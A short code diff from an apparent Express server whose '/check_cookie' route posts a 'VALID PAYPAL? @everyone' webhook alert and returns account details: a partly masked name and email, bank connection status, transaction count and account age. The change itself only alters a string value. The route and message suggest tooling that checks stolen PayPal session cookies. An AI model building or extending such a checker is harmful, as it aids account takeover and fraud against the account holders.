@@ -673,7 +673,7 @@ app.get('/check_cookie/id=43958/r', async (req, res) => {
       content: "VALID PAYPAL? @everyone"
   };
   await sendWebhookMessage(message);
-    const Robject = {"name": "Joshua ****", "email": "j***1@gmail.com", "bank_connected": "true", "transaction": "211", "age": "08/11/2019"}
+    const Robject = {"name": "Joshua ****", "email": "j***1@gmail.com", "bank_connected": "True", "transaction": "211", "age": "08/11/2019"}
     res.json(Robject);
 });
 
